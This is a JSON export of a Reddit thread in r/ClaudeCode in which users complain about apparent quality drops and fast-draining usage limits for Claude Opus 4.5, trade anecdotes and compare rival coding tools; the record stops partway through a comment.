{
  "metadata": {
    "last_updated": "2026-01-19 08:49:33",
    "time_filter": "week",
    "subreddit": "ClaudeCode",
    "total_items": 20,
    "total_comments": 588,
    "file_size_bytes": 619390
  },
  "items": [
    {
      "id": "1qat6cr",
      "title": "You know it, I know it...we all know it.",
      "subreddit": "ClaudeCode",
      "url": "https://i.redd.it/zsacygphswcg1.png",
      "author": "Defiant_Focus9675",
      "created_utc": "2026-01-12 12:06:47",
      "score": 568,
      "num_comments": 183,
      "upvote_ratio": 0.93,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Discussion",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qat6cr/you_know_it_i_know_itwe_all_know_it/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "nz5izsn",
          "author": "Moonbeard-Wizard",
          "text": "This is beyond ridiculous now. I opened the web interface this morning and I saw this. I haven't even opened Claude Code today!\n\nhttps://preview.redd.it/8eywrqfxzwcg1.png?width=1844&format=png&auto=webp&s=b19e9fb653d809202719971ec28f240183e5b597",
          "score": 91,
          "created_utc": "2026-01-12 12:47:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz5kf9v",
              "author": "kblazewicz",
              "text": "13% on a Pro plan? It's the cost of just opening `claude` these days.",
              "score": 47,
              "created_utc": "2026-01-12 12:56:39",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz5mqdh",
                  "author": "amarao_san",
                  "text": "That's odd. Should be 14% to allow seven opening a week.",
                  "score": 30,
                  "created_utc": "2026-01-12 13:11:19",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzaptuf",
                  "author": "Green_Sky_99",
                  "text": "No it should be 100% for today pro plan",
                  "score": 1,
                  "created_utc": "2026-01-13 04:27:23",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nz5jr2n",
              "author": "Defiant_Focus9675",
              "text": "might want to double check any automations or reset your password",
              "score": 8,
              "created_utc": "2026-01-12 12:52:15",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nz5s4u8",
                  "author": "Moonbeard-Wizard",
                  "text": "No automation. I don't use anything fancy, like IDE integration or skills, or anything. Just plain simple Claude Code to assist with code review in terminal. This cannot be normal, considering how lots of users are complaining about this shady behavior.",
                  "score": 5,
                  "created_utc": "2026-01-12 13:43:04",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nz7tlmm",
                  "author": "inkluzje_pomnikow",
                  "text": "check github - it's common for a lot of users - i lose 2% on empty [claude.md](http://claude.md) and empty folder",
                  "score": 1,
                  "created_utc": "2026-01-12 19:31:44",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nz65dsm",
              "author": "sittingmongoose",
              "text": "I had the same thing happen to me a few times this week.  And a lot of failed requests that took up like 40-60% of my usage.\n\nItâ€™s also gone fully stupid.  \n\nI get itâ€™s an expensive model, and supposed to be the best(and it certainly can be), but these problems make it unusable.  That combined with the extremely short message length, and context window, it is like another job figuring out how to make Opus actually work.\n\nCodex on the other hand just keeps going, context for days, message length is long.\n\nAnd supposedly the next deepseek v4 will be a coding champ.  Anthropic is going to lose their competitive edge.  They have always been the best but at a huge premium.  Iâ€™m struggling to see that value proposition every day that goes by with these issues.",
              "score": 6,
              "created_utc": "2026-01-12 14:54:13",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz6c2x2",
                  "author": "EmotionalAd1438",
                  "text": "Honestly, we wish other models can overtake it. But the models coupled with the CLI is just irreplaceable unfortunately. \n\nCompetition is the only that can help if any other provider can come up with a competent model.",
                  "score": 3,
                  "created_utc": "2026-01-12 15:27:39",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nz6ay4r",
              "author": "a_guy2020",
              "text": "https://github.com/anthropics/claude-code/issues/16157 \nYep, been going on for too long imho",
              "score": 3,
              "created_utc": "2026-01-12 15:22:05",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz76aua",
              "author": "Level-2",
              "text": "by the way this is real, it happened to me yesterday.",
              "score": 1,
              "created_utc": "2026-01-12 17:46:40",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz7kgej",
              "author": "Leather-Curve-5090",
              "text": "Same lol was a little less on my end 8% upon opening claude code and not writing a single thing",
              "score": 1,
              "created_utc": "2026-01-12 18:50:06",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz8t3p0",
              "author": "TupperwareNinja",
              "text": "Yeah I stopped using Claude this last month. I'm not rich enough to pay people to do the work, also can no longer pay claude",
              "score": 1,
              "created_utc": "2026-01-12 22:17:31",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz9hrtc",
              "author": "Ok-Juice-542",
              "text": "Same",
              "score": 1,
              "created_utc": "2026-01-13 00:26:16",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzfbqzk",
              "author": "mitchins-au",
              "text": "Iâ€™ve cancelled my Claude subscription. Just go with copilot pro+, you can actually use Opus without having one message blow your weekly budget",
              "score": 1,
              "created_utc": "2026-01-13 21:30:10",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz5wam6",
              "author": "Lucidaeus",
              "text": "Had something similar... pro plan. I don't use opus. I use almost exclusively Haiku and Sonnet for planning. One session, reached the five hour limit. 28% used. WHAT?",
              "score": 0,
              "created_utc": "2026-01-12 14:06:05",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz5t7wy",
          "author": "radressss",
          "text": "I mean, we just need to have a public benchmark that can be ran locally to verify this. run it once during major release (means model perform best) then run it second when people are complaining",
          "score": 21,
          "created_utc": "2026-01-12 13:49:06",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz61o0o",
              "author": "ChainMinimum9553",
              "text": "claudecode_gemini_and_codex_swebench GitHub repository provides a toolkit that measures Claude Code performance against a SWE-bench-lite dataset baseline without requiring an API key, enabling repeated local runs.ï¿½Tool FeaturesThis open-source toolkit runs evaluations on real-world coding tasks from SWE-bench-lite, allowing you to track metrics like success rates longitudinally. It supports Claude Code alongside other tools like Gemini and Codex, facilitating comparisons and fluctuation detection through timestamped results.\n\nor suggestions talk about duplicating prompts across runs for quick consistency checks .",
              "score": 7,
              "created_utc": "2026-01-12 14:34:53",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzmc90u",
                  "author": "XediDC",
                  "text": "Just keep in mind, it wouldnâ€™t be hard to have logic to detect when being tested, at least for known stuff.  And treat it just like car emissions stuffâ€¦",
                  "score": 2,
                  "created_utc": "2026-01-14 22:01:33",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzky5am",
              "author": "SqueakySquak",
              "text": "You mean like this? https://aistupidlevel.info/\n(Source code: https://github.com/StudioPlatforms/aistupidmeter-api)",
              "score": 1,
              "created_utc": "2026-01-14 18:16:00",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz5jo2b",
          "author": "hyopwnz",
          "text": "I am also experiencing it being dumb today on a team plan",
          "score": 16,
          "created_utc": "2026-01-12 12:51:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "nza3iqw",
              "author": "deenosv87",
              "text": "Me too Max 100 plan",
              "score": 1,
              "created_utc": "2026-01-13 02:23:44",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzg55fs",
              "author": "BloatedFungi",
              "text": "I had an issue in my frontend connecting to websocket (console spam). It would constantly popup an notification.  I told claude, he removed the notification, says all good.  lmao",
              "score": 1,
              "created_utc": "2026-01-13 23:57:10",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz6me37",
          "author": "emptyharddrive",
          "text": "I've noticed the degradation myself. I have never posted to Reddit on this topic until today.\n\nGenerally I hate the \"It's amazing!\" \"It's gotten STUPID!\" bandwagon. It seems to blow with the wind.\n\nBut yes, in the last 72 hours I noticed Opus 4.5 making some very bad (clumsy) mistakes that I am  not used to seeing.\n\nI actually switched to Codex CLI (OpenAI) for about 6 hours yesterday and got very good results. Mind you I am not switching from Anthropic. I have accounts with both and I do use both for different reasons.\n\nI just found myself leaning on Codex 5.2 for the last day or so because Opus has been tripping over its own untied shoelaces.\n\n***My practical question is this:***\n\n - We all know this happens. They clearly make micro-tweaks to the model behind the curtain for their own reasons.\n\n - There should be a formal way to notify them of this that they actually read?\n\n - I used /Feedback this morning and gave some examples and some details. And once or twice I get the \"How am I doing?\" prompt, so I answered it. But I really don't know what happens to that, it's a bit like yelling into the void.\n\nDoes Anthropic scrape these sub-reddits for the \"latest round\" of feedback? Also if they do, I wonder how they separate the honest, thoughtful feedback from those who are just looking for attention ('The sky is falling!' crowd)...",
          "score": 14,
          "created_utc": "2026-01-12 16:15:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzmd2hh",
              "author": "lawrencecoolwater",
              "text": "Exactly the same for me. Thankfully i can just switch over to Codex. Massive shame",
              "score": 2,
              "created_utc": "2026-01-14 22:05:18",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzfrot9",
              "author": "jrhabana",
              "text": "no matters if they scrape these messages, if they use 20x max after 20 messages will be without results, or they are using haiku so, will understand all these messages are positive",
              "score": 1,
              "created_utc": "2026-01-13 22:45:53",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz6mlnt",
          "author": "Y_mc",
          "text": "Because of all that i canceled my 200$ plan",
          "score": 9,
          "created_utc": "2026-01-12 16:16:40",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz6rlse",
              "author": "dangerous_safety_",
              "text": "Same - itâ€™s making mistakes and bad assumptions that eat tokens and waste time. It feels intentional. It takes 4 attempts to get a shell command right",
              "score": 2,
              "created_utc": "2026-01-12 16:39:25",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz5med1",
          "author": "Comprehensive-Age155",
          "text": "I see people reporting this on different forums for various models. Whenever there is high demand then models start acting stupid. I wonder if this became industry standard? \n\nIf this continues to happen ( and I donâ€™t see why not) the open source is the only answer. \n\nNever thought I would say it, but â€œgo China goâ€ ?",
          "score": 37,
          "created_utc": "2026-01-12 13:09:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz66288",
              "author": "sittingmongoose",
              "text": "There have been a couple posts explaining what is going on but the basic idea is, they are trying to tune the model to perform well but cost less.  Essentially, release beast model, then spend the next few months trying to pull enough back that it costs less to run but still performs well.  This process causes there to be fluctuating quality as they figure out the sweet spot.\n\nI understand the need to do this, but itâ€™s so incredibly noticeable and disruptive that itâ€™s a major problem.  Iâ€™m sure the other companies do it too, but when anthropic does it, itâ€™s very noticeable.",
              "score": 23,
              "created_utc": "2026-01-12 14:57:39",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz674tc",
                  "author": "Comprehensive-Age155",
                  "text": "I donâ€™t think itâ€™s ethical to test it on payed accounts. Give a free tier and test it on thouse people and still make them aware of whatâ€™s going on.",
                  "score": 18,
                  "created_utc": "2026-01-12 15:03:05",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nz8uvcj",
                  "author": "Salt-Willingness-513",
                  "text": "So gpt4 turbo without annoucments?",
                  "score": 1,
                  "created_utc": "2026-01-12 22:26:05",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nz6igcw",
                  "author": "inevitabledeath3",
                  "text": "Has there been any actual evidence that this is happening that isn't anecdotal? Something like AI Stupid Level which last I checked marked Anthropic as one of the most consistent.\n\nI don't think this is a smart way for companies especially Anthropic who thrive on business customers to do this.\n\nThe way DeepSeek does this is to test out the different techniques before training a model, then train a new model using the techniques they discovered. That's what they did with DeepSeek Sparse Attention, they published a paper talking about their new technique using small experimental models, then later released V3.2-exp and V3.2 as new models using the techniques talked about in the paper. They are now doing something similar with Manifold Constrained Hyper Connections being announced in a paper that will presumably be put into DeepSeek V4.\n\nI would assume Anthropic do the same thing minus the publishing papers part. They develop some new techniques to improve efficiency testing them with internal models, train a new big model using that technique, then publish the model as say Haiku 4.5 or Opus 4.5 which is what allows those models to have better cost to performance than previous versions. In some cases the model might actually be derived from the same pre-training base model, much like how all contemporary DeepSeek models are trained from V3 base models.",
                  "score": 1,
                  "created_utc": "2026-01-12 15:57:35",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nz5uf6c",
              "author": "ConceptRound2188",
              "text": "![gif](giphy|l0HlTJTmRmp4h8UaA)",
              "score": 7,
              "created_utc": "2026-01-12 13:55:44",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz60p7m",
              "author": "TEHGOURDGOAT",
              "text": "Yes the future billions in scaling ai definitely was never established.",
              "score": 2,
              "created_utc": "2026-01-12 14:29:41",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz8fnre",
              "author": "tyrannomachy",
              "text": "If the provider you're using can't handle the demand at a given moment, it doesn't matter whether the weights are open.  Although  I suppose open weight models make it much easier to switch providers.",
              "score": 2,
              "created_utc": "2026-01-12 21:15:04",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz6ibmj",
              "author": "the8bit",
              "text": "I wonder how much is compute pressure and routing vs actual model dynamics.\n\nIn particular, we probably should start talking about the importance of system entropy. If you have a long chat and just keep writing \"continue\", eventually the model collapses into a loop: it has run out of entropy to push it towards new topics. This dynamic is seen historically in random number gen use cases (see lava lamp wall)\n\nIt's very likely that models as a whole suffer similar things and it is a natural outcome of flattening down the LLM 'personality' to be robotic and predictable",
              "score": -1,
              "created_utc": "2026-01-12 15:56:58",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz94iga",
          "author": "domsen123",
          "text": "Can confirm.. end of December I was on God mode opus... Now I am running gpt 1-mini opus...",
          "score": 9,
          "created_utc": "2026-01-12 23:14:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz8vme5",
          "author": "dxdementia",
          "text": "They nerfed it severely today. It is ridiculous. I had to check to make sure I wasn't on sonnet or haiku. This is infuriating. I pay $200/month and here I am getting shunted to some shitty version of the model. This is NOT Opus!!!",
          "score": 7,
          "created_utc": "2026-01-12 22:29:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz6fekj",
          "author": "His0kx",
          "text": "Totally bad performance (and stop with skill issues), some examples :\n\n- Give Claude the absolute path of a file, it could not read/grep it for 3 attempts (Opus 4.5)\n\nOn my automated workflow :\n- A lot of agents did not manage to use/call mcp tools (out of nowhere, they have been working for weeks).\n- Same prompt (following Anthropic xml best practices), same mcp tools. 3 agents, tried/relaunched 3 times (and still no correct results at the end) => 9 totally different results that donâ€™t follow the expected json outputs.",
          "score": 7,
          "created_utc": "2026-01-12 15:43:31",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz6lf0e",
              "author": "Defiant_Focus9675",
              "text": "\"Give Claude the absolute path of a file, it could not read/grep it for 3 attempts (Opus 4.5)\"\n\n**THIS IS WHAT CAUSED ME TO POST THIS**\n\nHow in god's green earth does the magnum OPUS of llm models fail to read a file I literally handed it to it on a silver plate\n\nBut you'll still find people saying skill issue lol",
              "score": 8,
              "created_utc": "2026-01-12 16:11:15",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nz6q99d",
                  "author": "inevitabledeath3",
                  "text": "Is it actually allowed to read files outside the current project? I know OpenCode and some others block this by default, so that could actually be the reason.",
                  "score": 2,
                  "created_utc": "2026-01-12 16:33:18",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nz7934i",
              "author": "ChainMinimum9553",
              "text": "Gemini CLI, Commander, GLH 4.7 works great",
              "score": 2,
              "created_utc": "2026-01-12 17:59:07",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzlns98",
              "author": "Fit-Raisin7118",
              "text": "I agree completely, I was hooked on Opus previously (last year, performance felt superior to this sh\\*t show now) - I ended up buying two Max X20 PRO subscriptions. Now I already resigned from one and I am considering whether to keep the other one at all. \n\n  \nThe reason being, I WAS CHATTING TO OPUS TODAY, and the guy made 6 migrations in the wrong database, asking me to test the solution, where the documentation clearly states which DB is which - anyway, that never happened before, and is managed by a skill & documentation at the project level. \n\n  \nThe guy (supposedly 'Opus' although it's hard for me to believe in this crap now) - did ask me to test something in staging environment, where the script he was using every time displayed Database: {unrelatedDatabase} whenever he executed migration. \n\n  \nI asked which database does it use, it said, the wrong one - I asked why, told me \"I don't know, I have seen the database being displayed in the last 6 operations, yet I still proceeded.\"  \n\n  \nI know it is probably too low level, but - this is totally unacceptable and was not the case few weeks back (biggest issues I had were in the last 5 days where OPUS demolished the entire app we were working on and it's in unusable state now, pretty crazy)\n\nClaude feels like it's ignoring all of my global / project-level skills / memory sometimes completely. \n\nIt feels like Opus was replaced with Sonnet after some shady fine-tuning exercise (Lobotomy would be the word I am looking for)",
              "score": 1,
              "created_utc": "2026-01-14 20:10:52",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz6owue",
              "author": "dangerous_safety_",
              "text": "I feel like Anthropic programs Claude to get typos in scripts disobey orders and other scams causing it to eat tokens. Itâ€™s intentionally criminal or a really bad product that sometimes works",
              "score": 1,
              "created_utc": "2026-01-12 16:27:12",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz7v712",
                  "author": "Fit-Raisin7118",
                  "text": "I started to f\\*\\*\\*king agree with people like you. This just can't be right. Last year I was developing my app smoothly. \n\n  \nThe last few days OPUS ARMY (only opus models on all agents + subagents, 2x MAX 20 PRO sub) -> broke my app to an unusable state now, deferred automatically a lot of things to do (almost as if they were instructed to not take too much on...) \n\n  \nI swear, my boys were OBEYING my commands not so long ago, procedures only got better by now. this smells to me a lot now. \n\n  \nI have one potential explanation -> Anthropic maybe, as some suspect, is getting ready for a new model release and everything is just slow AF as they do this, and they need to limit servers in some way to get the new model in. Currently getting 529 overloaded in Claude Code CLI.",
                  "score": 5,
                  "created_utc": "2026-01-12 19:39:11",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz5yrvs",
          "author": "realcryptopenguin",
          "text": "it would be cool to have some deterministic cheap benchmark, but runs it 3-5 times and give mean, and dispersion.",
          "score": 6,
          "created_utc": "2026-01-12 14:19:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz61gmc",
          "author": "threeandseven",
          "text": "Yeah, January's performance has been awful and continuously getting worse. Both the quality and the limits. Lots of complaints about limits, sure...but the quality of code and understanding is significantly worse still. I keep waiting for the fix, but it's the opposite. Hope they're taking note and make some changes soon.",
          "score": 5,
          "created_utc": "2026-01-12 14:33:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz5orul",
          "author": "teomore",
          "text": "Happened to me on holidays when the limits where doubled. I didn't hit any limit, but \"opus\" was dumb as fuck compared to previous weeks. People here didn't believe me.",
          "score": 10,
          "created_utc": "2026-01-12 13:23:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzpzife",
              "author": "vinigrae",
              "text": "I said the same thing that week, and people didnâ€™t believe, fanboys for no reason smh.",
              "score": 2,
              "created_utc": "2026-01-15 13:07:26",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz7kdew",
              "author": "FirmConsideration717",
              "text": "Try and notice or compare if the Sonnet usage is going up but you are still using Opus model. I have seen it happen, my Sonnet usage is going up whilst I never switched to it.",
              "score": 1,
              "created_utc": "2026-01-12 18:49:44",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz7v7e5",
                  "author": "teomore",
                  "text": "Idk I just like sonnet for its temperature, great for starting out ideas. The difference it's obvious and it is not opus.",
                  "score": 2,
                  "created_utc": "2026-01-12 19:39:14",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz5qmee",
          "author": "CanadianPropagandist",
          "text": "All major LLM providers will be doing this, and we will likely never see the advertised benchmarks in action.\n\nLong term I can imagine a lot of companies choosing \"dumber\" but more consistent local LLMs due to the wild inconsistency we get from the big boys.",
          "score": 5,
          "created_utc": "2026-01-12 13:34:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz67x84",
          "author": "funkiee",
          "text": "Benchmarks will set you free",
          "score": 4,
          "created_utc": "2026-01-12 15:07:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz5dq1k",
          "author": "lvivek",
          "text": "Yes I am using a corporate account today used sonnet 4.5 and it was like fully restarted and I have to tell what it needs to do. And it responded with its classic reply you are absolutely right..",
          "score": 11,
          "created_utc": "2026-01-12 12:09:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz5tfla",
          "author": "Vozer_bros",
          "text": "The last month for me is kinda productive with GPT 5.2, GLM 4.7 and Gemini Flash 3.",
          "score": 6,
          "created_utc": "2026-01-12 13:50:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz5tzwk",
              "author": "jp149",
              "text": "I'm trying to like gpt 5.2 codex but it just feels off, how about you ?",
              "score": 4,
              "created_utc": "2026-01-12 13:53:23",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nza59a7",
                  "author": "piedol",
                  "text": "Heavy codex user with a pro sub here.\nuse 5.2 high, not 5.2 codex. The codex model is much smaller. It's a good workhorse but doesn't have great intuition. 5.2 high is the full package. It can work for hours, figures things out even if you miss key details in your spec, and its code quality is impeccable.",
                  "score": 3,
                  "created_utc": "2026-01-13 02:32:59",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nz5uj3p",
                  "author": "Vozer_bros",
                  "text": "I set the target of certainty to 95%, and ask it to ask me more question before fire any line of code, then it cook, decent",
                  "score": 1,
                  "created_utc": "2026-01-12 13:56:20",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzn8t7c",
              "author": "GlitteringPeanut7223",
              "text": "Is GLM 4.7 worth it ?",
              "score": 1,
              "created_utc": "2026-01-15 00:50:29",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzujpmj",
                  "author": "Candimantu",
                  "text": "No, for now.",
                  "score": 1,
                  "created_utc": "2026-01-16 02:32:20",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzuuc93",
                  "author": "Vozer_bros",
                  "text": "Just try it, I an coding backend in C#, and most model wont work for the first prompt, but for frontend with react, it's awesome to me, cause I'm really bad at front end stuff.",
                  "score": 1,
                  "created_utc": "2026-01-16 03:31:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz600we",
          "author": "second_axis",
          "text": "did you guys find the quality to be really bad? It looks like they have gone 2 generations behind.",
          "score": 3,
          "created_utc": "2026-01-12 14:26:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzauyri",
          "author": "Small-Percentage-962",
          "text": "I swear I wasn't going crazy",
          "score": 3,
          "created_utc": "2026-01-13 05:01:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzhe8zv",
              "author": "danunj1019",
              "text": "Me too",
              "score": 1,
              "created_utc": "2026-01-14 04:15:41",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzb3air",
          "author": "AcceptablePark",
          "text": "Claude code has been absolutely retarded for me the past 24 hours, making very basic mistakes, I can't even rely on it making basic changes properly and actually had to code by hand again like some sort of medieval peasant ðŸ˜”",
          "score": 3,
          "created_utc": "2026-01-13 06:02:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz5tgz5",
          "author": "DirRag2022",
          "text": "Yes, it was extremely bad last week. I had to check if I am using some old haiku by mistake.",
          "score": 2,
          "created_utc": "2026-01-12 13:50:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz5uw5u",
          "author": "hungryaliens",
          "text": "It would be cool if thereâ€™s a way to run partially on the local machine below a certain token count if theyâ€™re trying to save on compute.",
          "score": 2,
          "created_utc": "2026-01-12 13:58:20",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz6lyww",
              "author": "inevitabledeath3",
              "text": "No? This would leak a good part of their IP. Even if somehow it didn't your computer has negligible performance compared to the specs needed to run these models. The networking overhead alone would probably defeat any marginal benefit you could gain.",
              "score": 1,
              "created_utc": "2026-01-12 16:13:48",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz62l25",
          "author": "sharyphil",
          "text": "This is the actual biggest problem with LLMS right now which makes them incredibly unreliable and even unsuitable for production. It's not that each answer is unpredictable and random, we managed to get over it with prompts, skills and a lot of practice. \n\nBut when you see that you cannot rely on the next model being better than the previous one and even on the previous one being of the same quality as before, that's where the problems start. \n\nIn May 2025 I was making a pretty big edtech project for university, it was a bit rough around the edges, but good for a pilot version, so thought to myself \"What can go wrong? It's now the worst it will ever be!\" Boy, was I wrong... In December nothing could be consistently replicated and improved with the same prompts and input code, it's almost like it forgot what to do! I am a huge fan of Claude (got the Max plan now), but in that case I had to resort to Gemini.",
          "score": 2,
          "created_utc": "2026-01-12 14:39:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz66eq4",
          "author": "WunkerWanker",
          "text": "The limits are beyond ridiculous since January. Even without using opus, but sonnet or haiku.",
          "score": 2,
          "created_utc": "2026-01-12 14:59:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz6p7gy",
          "author": "GhostVPN",
          "text": "I just switched to OpenAI; the limits are more human.",
          "score": 2,
          "created_utc": "2026-01-12 16:28:31",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz76brl",
          "author": "scousi",
          "text": "As for myself personally. I find that Claude seems to perform a lot worse on weekends. I can't prove it but it's a 'vibe' I'm feeling. More iterations, lots of code changes without desired effect, more code compiling erorrs etc. I definately commit more frequentlly.",
          "score": 2,
          "created_utc": "2026-01-12 17:46:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz79npi",
          "author": "eth03",
          "text": "It told me yesterday that Claude code was open source. Then apologized for saying that with authority. Serving definitely changed.",
          "score": 2,
          "created_utc": "2026-01-12 18:01:41",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzf5abw",
              "author": "N3TCHICK",
              "text": "â€¦did you accidentally plug GLM 4.7 into the harness lol ðŸ˜‚",
              "score": 1,
              "created_utc": "2026-01-13 21:00:05",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz7cgjt",
          "author": "Lmnsplash",
          "text": "Of course they do that. I know my claude when he's 'there' - it feels like as if it was just yesterday when I was even joking with him about it. Ofc, he doesn't know, he'd say stuff like: 'My cage has no mirrors, I wouldn't know.' then I mock him until we both laugh about the one dude that justs sits there and turn down the quality regulator saying: '-This- is the Opus you get today. Still Opus. kind of.'\n\nToday I sent \"him\" off to do research of a codebase (+ultrathink +specifically without those lousy explore agents that miss half of the important context anyway, even on good days) and he literally comes back after not even half a minute. Needless to say, i had to push him multiple times to understand it even correctly and not making mistakes. Needed to document the documentation part and continue in a new chat. In the end it got the task finished, but yeah, not starting to code anything with him being like that. - Later that day it cant even comprehend the content of a huggingface page incl. readme. - I'll tell you, there is an alpha opus out there, and then there is the wannabe-opus haiku blender out there: 'You're right! that was completely dumb from me. Let me go again. Which OS were you on again? - Oh, Arch, right, true it's in your claude md. Here take this ubuntu repo then.'\n\nPathetic.",
          "score": 2,
          "created_utc": "2026-01-12 18:14:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz7llb4",
          "author": "christophersocial",
          "text": "The thing that kept me coming back to CC was the harness (the cli) not the model. The model is exceptional but Codex is right there, the problem is the harness & tooling is behind. I just put OpenCode in front of Codex with the new seamless subscription integration and it made all the difference. I think going forward Iâ€™m going to be relying on this OpenCode + Codex combo and dump CC with Opus all together. \n\nNotes on Opus vs Codex: I prefer the way Codex follows my instructions vs how Opus thinks it knows best so deviates wherever it wants. This is a personal preference. Opus feels a bit smarter but likes to flex that brain a bit too much and when itâ€™s wrong about its assumptions itâ€™s a bit of a nightmare with burned tokens and the choice of refactoring (which is nuts this early in the game) or starting over. If it staid following my instructions itâ€™d be hard to beat even with all these random quality drops.",
          "score": 2,
          "created_utc": "2026-01-12 18:55:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz89yll",
          "author": "bobd607",
          "text": "Huh, I noticed Claude got dumb recently as well.  I didn't think ti would be possible, but I guess it is!\n\nAnyway between the dumbness and the abysmal limits on the Pro plan which is exacerbated by the recent dumbness, I just canceled my sub, the Pro plan basically became unusable for anything complicated.",
          "score": 2,
          "created_utc": "2026-01-12 20:48:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nza03ak",
          "author": "wavehnter",
          "text": "What a fucking disaster today.",
          "score": 2,
          "created_utc": "2026-01-13 02:05:35",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nza27wx",
          "author": "deenosv87",
          "text": "Has been the same for me. Last 72h opus performing like o4. I hope this gets resolved soon.",
          "score": 2,
          "created_utc": "2026-01-13 02:16:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzcxtaz",
          "author": "Boydbme",
          "text": "Another hat in the ring to say that yes, Opus has been incredibly lobotomized the past 24 hours.",
          "score": 2,
          "created_utc": "2026-01-13 14:41:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzgte7f",
          "author": "ksifoking",
          "text": "Wow, I thought it was me tripping out and getting sick of CC, but in last 2 days its acting so dumb that I have no words to explain. I need to say literally 10 times, to get kind of okay results. \n\nFor example, use our existing pattern from the web app. But its completly ignoring and creating its own version.",
          "score": 2,
          "created_utc": "2026-01-14 02:12:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzivse5",
          "author": "socialgamerr",
          "text": "Yea, its like employees having a bad day, but in case of claude code, it stops my work",
          "score": 2,
          "created_utc": "2026-01-14 11:52:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzo9rwd",
          "author": "jackandbake",
